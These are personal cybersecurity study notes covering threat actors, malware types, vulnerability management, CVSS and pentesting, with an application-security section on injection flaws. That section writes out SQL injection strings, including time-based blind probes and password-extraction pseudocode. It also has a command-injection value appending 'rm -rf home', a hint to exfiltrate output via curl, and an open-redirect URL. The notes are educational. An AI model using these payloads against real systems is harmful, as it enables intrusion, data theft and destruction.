# Cybsersecurity

## Links

* [Resources](resources.md)

## General Concepts

### The 3 Cybersecurity Objectives

* **CIA** Triad == The 3 Objectives/goals
  * **Confidentiality** - No unauthorized individual is able to access sensitive information.
  * **Integrity** - No unauthorized changes to systems or data.
  * **Availability** - Informations and systems are ready to meet the needs of legitimate users at the time those users request them.
* 1 Additional goal/objective
  * **Nonrepudiation** - Someone who performs some action, cannot later deny having taken that action.
    * Digital signatures are commonly used

### Security Incident

* When there is a breach of any of the CIA Triad goals.
  * Tip: Security therefore is not only about dangerous individuals, but also events like an earthquake.

### The 3 Cybersecurity Threats

* **DAD** Triad
  * Disclosure (aka data loss) <-> Confidentiality violation
    * Data exfiltration (the act of moving data outside the intended organization/boundaries)
  * Alteration <-> Integrity violation
  * Denial <-> Availability violation

### Breach Impact

Types of impact/risks when a security incident happens. Many risks cover multiple types.

* **Financial** - Equipment broken, new datacenter, loss of revenue, ...
* **Reputational** - Negative publicity
* **Strategic** - IP that allows competition to act faster, outsmart you, copy you, ...
* **Operational** - inability to do day-to-day functions, slow down business processes, ...
* **Compliance** - violating a legal or regulatory requirement (e.g. HIPAA)

### Security Controls

* **Control Objectives**: Statements of desired security state (requirements).
* **Security Controls**: Speciifc measures, the implementation of the objectives/requirements.
* **Gap analysis**: Analyse gap between the Control Objectives and the Security Controls.
  * Here we do actually Security Assesment and Testing.
* **Security Control *Categories***:
  * Technical - digital implementations (firewall rules, access control, ...)
  * Operational - processes (access reviews, log monitoring, ...)
  * Managerial - procedural mechanisms (periodic risk assesment, security planning excerices, ...)
  * Physical - physical implementation (locks, fences, ...)
** Security Control *Types***
  * Preventive - Stop before it occurs (Firewalls, ...)
  * Detterent - Prevent from attempting to violate the security policy (guarddogs, ...)
  * Detective - Identify security events/issues that already have happened (Intrusion Detection Systems IDS, ...)
  * Corrective - Remeditate a security issue that has happened (restore from backup, ...)
  * Compensating - Mitigates the risk with alternative methods if the original control requirement.
    * 3 criteria for PCI DSS
      * Must meet the intent and rigor of the orginal requirement
      * Must provide similar level of defense as the original
      * Must be above and beyond other PCI DSS requirements
  * Directive - Inform employees and others what they should do to implement security objectives.

### Data Protection

* 3 States of data
  * Data-at-rest
  * Data-in-transit
  * Data-in-use
* **Data Loss Pevention (DLP)**
  * Information handling policies and procedures to prevent data loss and theft.
  * 2 Environments
    * Agent-based DLP - Installed as agents on a system to scan/monitor for senstive information, system config or actions.
    * Agentless/network-based DLP - Monitors network traffic for risk or proof of data loss. Mostly to pick up on unencrypted content.
  * DLP can take actions
    * Pattern matching - find Social Security number formats, sensitive terms etc and trigger on that.
    * Watermarking - tag sensitive documents, and the DLP scans all those tagged documments to find unencrypted data
* **Data Minimization** - minimaize the amount of senstive data
  * Best: Destroy data once not required anymore
  * Data deintification - remove possibility to link data back to an individual
  * Data obfuscation - impossible to retrieve original data
    * Hashing - senstive to *raindbow table attack*
      * Raindbow Table Attack: If someone knows the hashing algoritm, they can hash all the IDs and use it later to reverse lookup.
    * Tokenization - Use an intermediate ID between data and indivudal and secure that (like different IDs per user)
    * Masking - Partial redacting (like credit card **** **** 0321)
* **Access Restrisctions**
  * Limit ability of individuals/systems
  * 2 Types
    * Geographical: Limit based on geography of individual/system
    * Permission: Limit based by role or level of authorization
* **Segementation and Isolation**
  * Segmentation - Allows systems only to talk to each other within the same segment or limited access to other segments.
  * Isolation - Enirely isolates a system from talking to others

## Threat Landscape

### Threats
* **Threat Characteristics**
  * Internal vs. External - Within or outside our organization.
  * Level of Sophistication/Capability - from script kiddie to APT (advance persistant threat)
  * Resources/Funding - from hobbyists to government funded
  * Intent/Motivation - from "trill" to "warfare", from white to black hat
    * White Hat - Act with authorization and seek vulnerabilities with the intent of correcting them.
    * Grey Hat - Act without authorization, but seek to inform targets from found vulnerabilities.
    * Black hat - Act without authorization, with malicious intent.
* **Advance Persistent Threat (APT)** - Advanced attacks that persistent for a long time, stalking targets to attach when most strategic.
* **Shadow IT** - Indivduals/groups use technology/tools that are outside the approved solutions.
* **Threat Actors**
  * Unskilled - (Script kiddie), little skill, depend on (automated) tools they downloaded, often don't understand how the tools work.
    * Do not underestimate this threat and risk
    * They often randomly take targets, and there are many.
  * Hactivists - Want to reach an activist goal
    * Might take greater risk, cause their goal is more important than getting caught. Maybe even martyrdom.
  * Organized Crime - Primairy goal is to make money
    * Like to be low profile, not get caught, it takes money to make money
  * Nation-State Attackhers - Often do APT, it's all about strategic power and influence.
    * They often search for Zero-Day attacks and exploit them.
  * Insider Threat - Employer, contractor, vendor or anyone with authorized access attacks the organization.
  * Competitors - Corporate espionage

| Characteristic            | Unskilled | Hacktivists | Organized Crime | Nation-State | Insider | Competitor |
| ---                       | ---       | ---         | ---             | ---          | ---     | ---        |
| Internal/External         | External | External (mostly) | External | External | Internal | Both |
| Sophistication/Capability | Low | Any Level | Mid to High | High | Any | Any |
| Resources/Funding         | Few | Any range | Many | Many | Few | Many |
| Intent/Motivation         | Thrill/status | Ideals | Money | Economic/Espionage/Political | Varied | Economic/Business |

* **Attaker Motivations**
  * Data exfiltration - desire to obtain sensitive/IP information.
  * Espionage - organizations desiring to steal secret information
  * Service disruption - Seek to stop opperations
  * Blackmail - Seek to get money or concessions by threating to release secret info or more attacks.
  * Financial Gain
  * Ideoligy/Beliefs
  * Ethical - White hat
  * Revenge - just to embarrse or damage
  * Disruption/chaos
  * War - Manipulate the outcome of an armed conflict
* **Threat Vectors and Attack Surfaces**
  * Attack Surface - A llsystem/application/service that could be potentially exploited
  * Threat Vector - The actual vulnerability chosen from the attack service. The means to obtain that access.
  * Message-Based - Email is most exploited attack vector.
    * They only need ONE person to be tricked.
    * Other channel: SMS, IM, Voice call, ...
  * Wired networks - physically connecting to the on-prem network, or accessing a device that's connected to it.
  * Wireless networks - Don't require physical access to the network, bluetooth is also a risk.
  * Systems - Individual systems
  * Files & Images - Infected files with malicious code that trigger once openend.
  * Removeable devices - USB drives, Memory cars, trick anyone to put it in their computor.
  * Cloud - Default configs, public access, of any cloud service.
  * Supply Chain - Interfere with the organization's IT supply chain (e.g. infect OSS packages, patched hardware, ...)
    * Managed Service Providers (MSPs) often have special priviledge access to an organization's network.
    * Hard to adress and mitigate

### Threat Data & Intelligence

* **Threat Intelligence**: Resources and activities available to learn about changes in the threat environment.
  * Can be used for predictive risk.
  * OSINT tools/methods
  * Vunerability databases
  * Threat feeds
  * Indicators of compromise (IoCs) - Like file hashes, signaturesm ,,,
* **OSINT**
  * Key is to find up-to-date sources
  * [Examples](./resources.md#Threat%20Feeds)
* **Proprietary & Closed-Source Intelligence**
  * Might provide, better, curated and quality threat feeds
* **Use multiple feeds** - To cross check if any is slow or not updating
* **Threat Maps** - Geographic view of threat intelligence, but notoriously unreliable (VPNs, Proxies, ...)
* **Assessing Threat Intelligence** - regardless the source, assesment is required
  * Is it timely?
  * Is this information accurate? - Can you rely on provided information? Often correct?
  * Is this information relevant? - Might not be relevant to your organization
  * *Confidence Score* - Filter/assess data based on how much they trust it.
    * The lower the score, one should be cautious to make important decisions, but not ignore the source
    * The higher the score, the more trust and cofidence can go in major decisions.
  * Many threat feeds provice a score. For example:
    * 90 - 100: Confirmed - multiple sources and direct analysis to confirm its true
    * 70 - 89: Probable - Depends on logical inference
    * 50 - 60: Possible - agreed with the analysis but assesment not confirmed
    * 30 - 49: Doubtful - Possible but not the most likey option, but there is no information that allows to disprove it
    * 2 - 29: Impropable - Possible but refuted by others
    * 1 : Discredited - Just plain not true
* **Threat Indicator Management & Exchange** - standerized communication protocals
  * Structured Threat Information eXpression (STIX) - XML, a json variation exists
  * Trusted Automated eXchange of Intelligence Information (TAXII) - communicate on HTTP level.
  * [See Github](https://oasis-open.github.io/cti-documentation/)
* **Information Sharing Organizations**
  * Industry-specific collaborative organizations that facilitate trusted human + machine
  * Information Sharing and Analys Centers (ISACs) - for intrastructuree owners and operators
  * [National ISACS](https://www.nationalisacs.org/)
* **Conducting Your Own Research**.
  * Vendor security information sites
  * Academic Journals and Technical Publications
  * Conferences and meetups
  * Social Media accounts of security professionals.

## Malware Types
*Understand what differentiates them*

* **Ransomware** - Take over computer and demand ransom
  * Crypto - Encrypts files and holds those hostage until payment made
  * Threaten to report the user un return for money.
  * Delivery Methods - Often via phising, Remote Desktop Protocal, etc..
  * *Indicators Of Compromise (IoCs)*
    * Command & Control (C&C) traffic to known malicious IP addresses.
    * Use of legitmate tools in abnormal ways to retain control of compromised system.
    * Lateral movement processes that seek to attack/gain info about other systems in same trust boundary.
    * Encryption of files
    * Data exfiltration behaviors
    * Notices to end user of the encryptoion process with demands for ransom
  * *Defense* - Effective backup system in another location
* **Trojans** - Software often disguised as legitimate software, require user action
  * Rely on unexpected victims to run them
  * Sometimes further content is downloaded to extend the malicious code
  * Connects to a control server and then waits for instructions, allows for local instructions and such
  * Example: Triada Trojan which was a enhanced version of Whatsapp
  * RAT: Remote Access Trojans - give attackers with remote access to systems
  * *Indicators Of Compromise (IoCs)*
    * Signatures for specifc applications and downloadable files
    * Command and control system hostnames and IP addresses
    * Folders or files created on target devices
    * Frequently connecting to changing remote unknown hosts
  * *Defense*
    * Awareness training
    * Control software that (can) be installed
    * Verify hashes
    * Anti-malware
    * Endpoint detection and Response (EDR)
* **Worms** - Spread themselves
  * Spread via *vulnerable services*, email attachments, network file share, IoT, phones, ...
  * They self install
  * Example: Stuxnet
  * *Indicators Of Compromise (IoCs)*
    * Known malicious files
    * Download of additional components from remote systems
    * Command and control contact to remote systems
    * Malicious behaviors using system commadns for injection and other activies
    * Hands-on-keyboard attacker activity
  * *Defense*
    * Pre infection
      * Network-level controls
      * Fire-walls
      * Network segmentation
    * Post infection
      * antimalware
      * EDR
      * Reset hardware
* **Spyware** - designed to obtain information about individual/organization/system
  * Track installed software, browsing behavior, web camers, ... and report back to central server.
  * Stalkerware -> for monitor partners in relationship
  * It looks like many other malicious code, so the key is the "INTENT" of it's usage.
  * *Defense*
    * Antimalware
    * User awareness
    * Control software that (can) be installed
  * *Indicators Of Compromise (IoCs)*
    * Remove-access and remote-control-related indicators
    * Known software file fingerprints
    * Malicious processes, often disguised as system processes
    * Injection attack against browsers
* **Bloatware** - Preinstalled applications (that you don't want), just unwanted
  * Usually not intentionally malicious
  * May call home with information about your system and expose a vulnerbability to be exploited
  * *Defense*
    * Uninstall
    * Clean OS image
  * No IoCs
* **Viruses** - self-copy and self-replicate, but *don't* spread via vulnerable services and networks (unlike worms)
  * Require user action to spread, only runs when infected file is run
  * Usually have a trigger that decides when a virus will execute and a payload (what it will do)
  * Fileless virus - Shell code that runs command line and script to run malicious code and it will redo that after reboot, while booted, lives in memory often.
  * *Defense*
    * Network controls
    * Intrusion Prevention Systems (IPS)
  * *Indicators Of Compromise (IoCs)*
    * See threat feeds
    * User awareness
    * Antimalware
    * Best: Wipe it, and restart from clean image or safe backip
* **Keyloggers** - Captures keystrokes from keyboard (and mouse, credit swipes, and any other input)
  * Goal is for the attack to analyze these inputs
  * Exists as Sofware and hardware
  * *Defenses*
    * Usere Awareness
    * antimalware
    * Patching and updates
  * *Indicators Of Compromise (IoCs)*
    * File hashes and signatures
    * Extrafiltration activity to command and control systems
    * Process banes
    * Known reference URLS
* **Logic Bombs** - Functions or code placed inside other programs that will activate when set conditions
  * Either by insider or by OSS supply chain hack
  * Once it triggers, payload executes, so activites/actions happen then.
  * No IoC as it's in the code
  * Doesn't care to replicate
  * *Defenses*
    * Code reviews & Integrity checks
    * File integrity
* **Rootkits** - specificly designed for attackers to get a backdoor to the root of a system
  * Many have capabilities to hide , they use various layers to make them "not appear to be there".
  * Persistent, stealth access is the goal
  * *Defenses*
    * Clean rebuilt or trustworthy backup
    * Good security practices, patching, ...
    * Secure Boot
    * Remove the HDD and connect to other system without booting from that HDD, now no code will trigger.
  * *Indicators Of Compromise (IoCs)*
    * Files hashes and signatures
    * Command and control domains, IP addrewss and systems
    * Behavior based identification like creation of services, executables, configuration changes, file access and command invocation
    * Opening ports or creation of reverse proxy tunnels

* Notes
  * Different vendors might name the same malware different which makes it difficult
  * Remote access is usually via a backdoor, rootkit

## Social Engineering & Password Attacks

### Social Engineering

* Human side of cybersecurity
* **Social Engineering**
  * And phising often preceed password attacks.
  * Using the "Human Threat vector"
  * Goal: Influence target(s) to take actions that they else would not
  * Key Principiples to sucess:
    * *Authority* - Give the impression that you have authority, most people obey to someone that seems in charge or knowledgable, regardless if they are or not.
    * *Intimidation* - Scare or threaten the target so they feel threatened and they take the action that the attacker wants them to do.
    * *Consensus* - (aka Social Proof) people tend to do what other (many people already did), "everyone in here did this except for you"
    * *Scarcity* - Make something look more desirable to the target
    * *Familiarity* - Making the target like the attacker or the organization that the attacker claims to represent
    * *Trust* - Similar to familiarity, here the attacker builds a connection with their target to them make them do things.
    * *Urgence* - Sense or urgency to take the chance away for the target to evaluate the situation
  * Often a combination of principles are used.
  * Understand the target, how humans react, how stress reactions can be leveraged to meet a goal.
* **Social Engineering Techniques**
  * *Phising* - Fraudelent acquisition of information
    * Spear phising - targetting a specific individual/group
    * Whaling - aimed at senior people (CEO, CTO, ...)
    * Defenses: Awareness training
  * *Vishing* - Phising via phone call
    * Often based on urgency/trust and authority
  * *Smishing* - Phising via SMS/IM
    * Often based on urgency/trust and authority
    * Often trick someone to click on a link to enter credentials or senstive information
  * *Misinformation & Disinformation* - Online influencer campaigns
    * Social media, email, online mediums
    * Types (MDM)
      * **M**isinformation - Not True, *without* malicious intent
        * I believe it's true, but its wrong
      * **D**isinformation - Not True, *with* malicious intent
      * **M**alinformation - based on reaility, but consciously removed context and using exaggeration *with* malicious intent
    * CISA recommends "TRUST" oricess to counter mis/disinformation
      * **T**ell your story
      * **R**eady your team
      * **U**nderstand and assess MDM.
      * **S**trategize response.
      * **T**rack outocomes.
      * Defense: asses info environment, identify vulnerabilities, proactive communication, develop incident response plan.
  * *Impersonation* - Attack pretends to be someone else
    * Might use identity graud
  * *Business Email Compromises (BEV)* -
    * AKA Email Account Compromise (EAC)
    * Defeneses: Awareness and MFA
    * Methods
      * Using compromised accounts
      * Sending spoofed emails
      * Using common fake but similar domain techniques
      * Using malware or other tools
  * *Pretexting* - Using a made uo scenario on why the attacker approaches the target
    * Often to make impersonation more believable
    * Defeneses: Be critical, and do a verification call
  * *Watering Hole Attacks* - Use websites that the target frequently uses
    * Attackers can set an attack, knowing the target will visit the site. By compromising the site or deploying malway through advertising networks
  * *Brand Impersonation/spoofing* - Also a phising attack
    * Send email as if it comes from the brand
    * Often intended to have the target log in to a link
  * *Typosquatting* - Have a copy/compromised site with a common typo im url
    * *Pharming* - Changing the host file of a person to do similar attack

### Password attacks

* **Brute-Force** - Iterate through passwords until they find one that works
  * This can include using lists with generic commonly used passwords or tailored to the target
  * Many passwords attempts for a single user
* **Password Spraying** - a brute-force variation
  * Few passwords attempts but for many users
  * Example: On a sports fan website, most likely one user, uses the teams name or player as password
* **Dictionairy Attacks** - a brute-force variation
  * Uses a distinct list of words
* Popular Tool: [John The Ripper](https://www.openwall.com/john/) and [Tutorials](https://openwall.info/wiki/john/tutorials)
* Envirment
  * Online: Run and test passwords against life system with risk getting blocked/caught
  * Offline: You have the hashes or offline copy and you can in all peace go at it.
    * For example a precomputed list of hashes (Rainbow table attack)
      * Hash salts and peper is used to counter rainbow table attack

## Security Assesment and Testing

### Vulnerability Management

Definition: Identify, prioritize and remediate vulnerabilities in your environment(s).

* **Identify Scan Targets**
  * The scope depends, it can be all systems or depending on some critercia:
    * What is the data classification of the information at-rest/in-transit/in-use by the system?
    * Is the system publicly exposed?
    * What services are running on the system?
    * Is it dev/staging/prod?
  * Key goal: Build an asset inventory and then decide to which subset the scope reaches.
  * ASV: Approved Scan Vendor (in case of PCI DSS compliance)
* **Determin Scan Frequency**
  * How often should they run?
  * Influenced by
    * Risk appetite
    * Regulatory Requirements - Like PCI DSS or FISMA that dictate a minimum frequency
    * Technical Constraints - If a test takes 12h, you can only run 2/day.
    * Business Constraints - Scans might cause disruptions that are not acceptable.
    * Licensing limitations
  * TIP: Start Small and increase based on needs, feedback and experience.
  * Examples: Nesus
* **Configuring Vulnerability Scans**
  * *Scan Sensitivity Levels* - Determine the types of check, but could disrupt target environments if too agressive
    * 1 distinct vulnerability = 1 plugin
    * 1 plugin family = 1 OS, application, ...
    * Disabling unnecessary plugins improves speed
  * *Supplementing Network Scans*
      * Server-based scanning: Basic test run and probe over the network, testing from a distance - simulates realistically what an attacker sees. (ala Server-based scanning)
      * Firewalls and other security controls might impact the scan results.
      * Supplement server-based scans with extra information of the targets/systems
        * Credentialed Scanning: Scanner can verify first with a system if possible vulnerability is already mitigated (e.g. right patch installed). They only retrieve info, so make sure there is read only access (least privlege) for the used credentials.
        * Agent-Bases Scanning: Scan configuration, inside-out scan, and report back to scanner.
          * Some fear the performance/stability impact of such agents, start small to gain trust and confidence
  * *Scan Perspective*
    * A perspective: A specific location within the network, so you can run tests from different "perspectives".
    * Example: One perspective is public internet, Other perspective from the intranet. (PCI DSS requires this)
    * Might be impacted by
      * Firewall settongs
      * Network segmentation
      * Intrusion detection systems (IDSs)
      * Intrusion prevention systems (IPSs)
* **Scanner Maintenance**
  * Make sure that vulnerability feeds are up-to-date
* **Scanner software**
  * Make sure to patch the scanner software itself, for vulnerabilities.
* **Vulnerability Plug-In Feeds**
  * Automatically and regularrly auto download new plugs related to new vulnerabilities.
  * *Security Content Automation Protocol (SCAP)* - by NIST, Standerized way of communicating security-related information
    * Common Configuration Enumeration (CGE) - discuss system config issues
    * Common Platform Enumeration (CGE) - describe product names and versions
    * Common Vulnerabilities and Exposures (CVE) - describe security-related software flaws (before: Common Vulnerability Enumeration)
    * Common Vulnerability Scoring System (CVSS) - describe severity of CVE's
    * Common Configuration Checklist Description Format (XCCDF) - describe checklists and reporting results of said checklists
    * Open Vulnerability and Assesment Language (OVAL) - describe low level testing procedures by said checklists
* **Vulnerability Scanning Tools**
  * *Network Vulnerability scanners* - Tenable's Nessus, Qualy, Rapid7's Nexpose, OpenVAS
  * *Application Vulnerability Scanners* - Static Testing (the code), Dynamic Testing (runtime), Interactive Testing (combining both)
  * *Web Application Vulnerability Scanners* - Niko, Arachimi, Acunetix and Zed Attach Proxy (ZAP)
    * Specialized in WEB applications and their typical vulnerabilities
      * Cross-Site Scripting (XSS)
      * Cross-Site Forgery (XSF)
      * SQL Injection
      * Etc
* **Understanding CVSS (v3.1)**
  * This scored is often used to priorite what to act on first.
  * from 0 to 10 rating
    * 0.0 - None
    * 0.1 -> 3.9 - Low
    * 4.0 -> 6.9 - Medium
    * 7.0 -> 8.9 - High
    * 9.0 -> 10 - Critical
  * Calculated by
    * 3 metrics types
      * First 4 evaluate *the exploitability*
      * Next 3 evaluates *the impact*
      * Last 1 evaluates *the scope scope*
    * 8 distrinct metrics
      1. Attack Vector (exploitability) - Need to be physcally there or can it be remotly?
      2. Attack Complexity (exploitability) - Do I need specialized conditions ?
      3. Privileges Required (exploitability) - What privileges do I need  ?
      4. User Interaction (exploitability) - is another human required ?
      5. Confidentiality (impact)
      6. Integrity (impact)
      7. Availability (impact)
      8. Scope
    * The total score (and other derivates) can be computed, as the individual scores are in the CVSS format.
    * Example CVSS Vector: `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
      * CVSS Format `v3.0`
      * Attack Vector `Network`
      * Attack Complexity `Low`
      * Privileges Required `None`
      * User Interaction `None`
      * Scope `Unchanged`
      * Confidentiality `High`
      * Integrity `None`
      * Availability `None`
* **Confirmation of Scan Results**
  * When a vulnerability is present: Possitive report
  * When a vulnerability is not present: Negative report
  * A positive or negative report can be "false" if an error occurd and the opposite is true
  * Don't trust only the results, do supplementary research and verifications with sources like
    * Log files
    * Security Information and Event Management (SIEM) - corrolate log files from different sources
    * Configuration Management Systems - provide info on systems and what's installed on them

### Vulnerability Classification

* **Patch Management** - Often ignored due to lack of resources or "Fear" of change/instability
* **Legacy Platforms** - Discontinued products, Often ignored due to lack of resources or "Fear" of change/instability
* **Weak Configurations**
  * Use of default config (admin/setup page still exposed)
  * Default credentials or unsecured accounts
  * Open service ports (but unused)
  * Permissions that violate the least privilege
* **Error Messages** - Descriptive error messages, useful to the attacker, especially if debug mode is still on
* **Insecure Protocols** - Discontinued or old protocol versions
* **Weak Encryption**
  * Most important:
    * The algorithm
    * The key that goes with it

### Penetration Testing

* **Adopting the Hacker Mindset** - Instead of defending against everything, you just need to find one little crack, you only need to win once
  * Taking an adversary mindset
* **Reasons for Penetration Testing**
  * Complentary to all other efforts, and brings another angle.
* **Benefits of Penetration Testing**
  * Benchmark: someone with the skillset of this pen tester can or cannot get in
  * Get remediation tips and insights
  * Get step by step insights on how to reproduce vulnerabilities
  * **Threat Hunting** is also using a hacker mindset, but you don't test against the live system,
    * They imagine on how a hacker might have getting around a security control, what evidence they might leave behind and then search for proof (IoCs).
    * THis outputs usually different results.
    * If they find compromise, go incident handling mode, and create postmortem.
* **Penetration Test Types**
  * 4 Categories
    * Physical - focus on physical security controls
    * Offensive - By redteam - Pentester acts as attackers to identify and exploit
    * Defensive - By blueteam - Focus on ability to defend against attacks and assses the effectiveness, so they can simulatee an attack and then see if they're able to respond well.
    * Integrated - Combines Offensive and Defensive
 * 3 types of knowledge before starting
  * White/Clear Box or Known Environment tests - All tech information provided
    * Less time on discovery, more time for targetted efforts of attack.
  * Grey Box or partially known Environment tests - A blend
    * Helps to target a pentesters focus and time but still to a degree mimick the experience for a hacker.
  * Black Box or unknown Environment tests -
    * More real life situation that an attacker experiences, so more discovery and more time consuming.
* **Rules Of Engagement (RoE)**
  * Timeline - When, how long?
  * Scop - Inclide/exclude locations, systems, applications, or other potential targets
  * Data Handling requirements - How to handle an information that got disclosed during the pentest
  * Target Expected Behavior - What behavior to expect from the target
  * Commited Resources - Time commitment of certain personal during the testing
  * Legal concerns
  * When and how communications happen - regular updates? What if a critical issue is found ? etc...
  * Permission: Make sure to have a signed permission, your free out of jail card when getting caught or things go south.
* **Reconnaissance**
  * Even in white box, reconnaissance is done to supplement.
  * Passive reconnaisance - gather info without interacting with the target or organization
  * Active reconnaisance - directly engage, like port scanning etc...
    * Footprinting: Scanning which servers are used and versions
  * War Driving/Flying - Drive/Fly by office with high-end antennas and attempt to eavesdrop or connect to WIFI.
* **Running the test** - Key phases
  * Initial Access - when attacker exploits a vulberability to gain access to the organization's network.
  * Privilege Escalation - using hacking techniques to elevate from initial access.
  * Pivot/lateral move - hacker gains access to other systems from the initial compromised system
  * Establish persistance - Installing backdoors  and other techniques that allows to regain access at a later stage.
  * [Metasploit](https://www.metasploit.com/)
* **Cleaning Up**
   * Present results
   * Cleanup traves of their work
   * Remove any tools or malware they might have installed

### Audits and Assesments

* **Security Tests** - Verify that a control is functioning properly
  * Should happen regular
  * Focus on the key security controls
  * Asses following factors when scheduling a test
    * Availability of security testing resources
    * Criticality of the systems and appliications protected by the tested controls
    * Sensitivity of information contained on tested systems and applications.
    * Likelihood of technical failure of the mechanism implementing the control.
    * Likelihood of a misconfiguratiin on the control that would jeopardize security.
    * Risk that the system will come under attack
    * Other changes the technical env that might affect control performance.
    * Difficulty and time required to perform a control test
    * Impact of the test on normal business operation
  * TL;DR; Design your tests rigourisly
  * **Responsible Disclosure Programs**
    * Allows security researchers to securily info about vulnerabilities in a product with the vendor.
    * Bug bounties is a form of this
* **Security Assesments** - Comprehesive review of the security of a give scope
  * Perform risk assesment of a said scope
* **Security Audits** - External/impartial people who test the security controls
  * Uses similar techniques as security assesments
  * Results in an attestation (good for certification)
  * With internal auditing, the auditors have a different line of reporting than the security team.
  * Requested by the organization itself or its governing body
  * Service Organized Controls (SOC)
  * External audits are for attestation
    * Independent Third Party Audits are a subgroup
      * Here the request for the audit comes from a regulator, customer or other outside entity.
  * *Auditing Standards*
    * Control Objectives for Information and related Technologies (COBIT) - requirements surrounding information systems
      * Maintainted by ISACA which also created CISA (Certified Information Systems Auditor), CISM (Certified Information Security Manager)

### Vulnerability Life Cycle

* **Vulnerability Identification**
  * Potential Sources: Vulnerability scans, pentration tests, Responisble disclosure, Audits
* **Vulnerability Analysis**
  * Validate if it exists
  * Prioritize and categorize using CVE and CVSS
  * Supplement with external analysis
* **Vulnerability Response and Remediation**
  * Based on scoring, we can guide which are most in need of remediation
  * Some examples how Cybersecurity specialists deal with it:
    * Patching
    * Network segmentation to decrease the risk
    * Implement other compensating controls (Firewalls, IPS,...)
    * Purchase insurance to transfer risk
    * Formally accept risk
* **Vulnerability of Remediation**
  * Test by rescanning or reproducing
  * Might need to be done by external auditors
* **Reporting**
  * Communicate findings, action taken, lessons learned to relevant stakeholders. Make sure decisions makers are informed.
  * May include:
    * Identified, analyzed and remediated vulnberabilities with CVE/CVSS
    * Details on remediation steps
    * Highlight trends, conclusions, insights
    * Offer recommendations for improvement

## Application Security

### Software Assurance Best Practices

* **The Software Development Lifecycle**
  * Planning > Requirements > Design > Coding > Testing > Training & Transition > Ongoing Ops/maintenance > End Of Life (Decommission)
  * dev env > for devs
  * test env > QA/Preprod
  * staging > tested but awaiting deployment
  * prod
* **DevSecOps and DevOps**
  * Sec becomes a shared responsibility, just like the Ops.

### Designing and Coding For Security

* **Secure Coding Practices**
  * Open Worldwide Application Security Project (OWASP) - best resource for secure coding practices.
  * Top Proactive Security Controls by OWASP
    * Define Security Requirements
    * Leverage Security Frameworks
    * Secure Database Access
    * Encode an Escape Data
    * Validate all inputs
    * Implement DIgital Identity
    * Enforce Access Controls
    * Priotect Data Everywhere
    * Implement Security Logging and Monitoring
    * Handle all errors and exceptions
  * [OWASP Proactive Controls](https://top10proactive.owasp.org/)
  * [OWASP Quick Reference](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
* **API Security**
  * [OWASP API Security](https://owasp.org/www-project-api-security/)

### Software Security Testing

* [State Of Software Security Report](https://www.veracode.com/resources/analyst-reports/state-of-software-security-2025/)
* **Analyzing and Testing Code**
  * Static Code Analysis - reads the actual code to find flaws in it
  * Dynamic Code Analysis - runs the code to find flaws in it
  * Fuzzing - send random data to application to see how it handles unexpected data

### Injection Vulnerabilitiies

* **SQL Injection Attacks**
  * Is also a class under Code Injection attacks.
  * Happens when User Input is directly used in a SQL Query
    * Query Used `SELECT * FROM Products WHERE Name LIKE '%user_input_value%'`
    * User Input `cola'; SELECT * FROM users; --` instead of just `cola`
    * Results in : `SELECT * FROM Products WHERE Name LIKE 'cola'; SELECT * FROM users; --`, so 2 SQL queries
    * However, the results might not be returned/visible to the user, solution? *Blind SQL Injection*
    * **2 Blind SQL Injection Types**
      * *Blind Content-Based SQL Injection*
        * First: Validate if SQL Injection is possible
        * Asume we expect an UserID as User input, and let's assume `123` is a vailid UserID.
        * Query Used `SELECT * FROM Users WHERE Id = '%user_input_value%'`
        * Specify `123' OR 1=1` which results in `SELECT * FROM Users WHERE Id = '123' OR 1=1`
        * This returns multiple rows, did it break anything on the front end? No ? Good ✅
          * You might not see the multiple rows due to business logic,but it DID EXECUTE properly (you get feedback that the query was valid)
        * Now specify `123' OR 1=2` which results in `SELECT * FROM Users WHERE Id = '123' OR 1=2`
        * This returns no row, did it break anything on the front end aside of just saying that there were no results? Yes ? Good ✅
        * We can now asume that SQL injection is possible.
        * ***Now you can inject other querys that ALTER data. The baseline feedback if it was succesful or not your query is established in previous steps. Based on the _CONTENT_ you were able to validate if your queries are working***
      * *Blind Time-Based SQL Injection* - (example in Microsoft SQL)
        * First: Validate if SQL Injection is possible
        * Asume we expect an UserID as User input, and let's assume `123` is a vailid UserID.
        * Specify `123'; WAITFOR DELAY '00:00:15'` which results in `SELECT * FROM Users WHERE Id = '123'; WAITFOR DELAY '00:00:15'`
        * If the query now takes 15 seconds to execute, we can be quite confident that the SQL injection is possible. ✅.
        * ⚠️ Now this "timer" trick, can be also used to signal back if something was 'true' (if true, wait 15 seconds, else not).
          * An example, assuming the password is cleartext
          ```
            For each character in the password
              For each letter in the alphabet
                if the current character is equal to the current letter, wait 15 seconds before returning results
          ```
* **Code Injection Attacks**
  * Examples
    * LDAP Injection Attack - Embed commands in text as part of a LDAP query
    * XML Injection Attack - Embed code in XML text
    * DLL Injection Attack - Force an application to load a (malicious) DLL that was not a part of the process.
    * Cross-Site-Scripting (XSS)
* **Command Injection Attacks**
  * When an application executes a command against the OS, there is a potential for exploitation.
  * Example
    * You have a webpage to create a user and the end user must specify a username in a form
    * On creation, the app might run a command to create a folder for that new user `system('mkdir /home/students/<mynewusername>`)
    * What if the user specifies `mynewusername && rm -rf home`
    * Now we have piped again additional commands
    * ⚠️ Note that there is again no feedback/response, but you could try to have a script use a time or a `curl` command to post back the output to a webserver you own.

### Exploiting Authentication Vulnerabilities

* **Password Authentication**
  * Flaw: Once an attacher knows a password, they can keep using it for access.
  * Risk: Social Engineering, unencrypted traffic, password dumps from hacked sites, brute force, guessing
* **Session Attacks**
  * *Cookie Stealing & Manipulation*
    * Steal an existing (authentication) session
    * After auth, the session token is stored in browser cookie for further request auth
    * How to steal it?
      * Unencrypted network traffic
      * Malware in browser
      * On Path attack - Impersonate target site, forward the actual credentials to target site, return the request to the user with the cookie, but now you also have that cookie. (But you know then the credentials either way?)
    * Once you have the cookie
      * Session Replay Attack - The attacker reuses the session of the target
    * Defenses
      * Mark Cookie `SECURE` - tells the browser to never send it over unencrypted requests
    * NTLM pass-the-hash
      * NTLM hash is the hash function in windows to store user's passwords.
      * So if you can intercept this hash, instead of the username/password, you can also authenticate in/with windows.
  * *Unvalidated Redirects*
    * Example: `example.com/order?redirect_ok=https://evilsite.com` and then the evil site can impersonate and ask to re authenticate again or whaterver
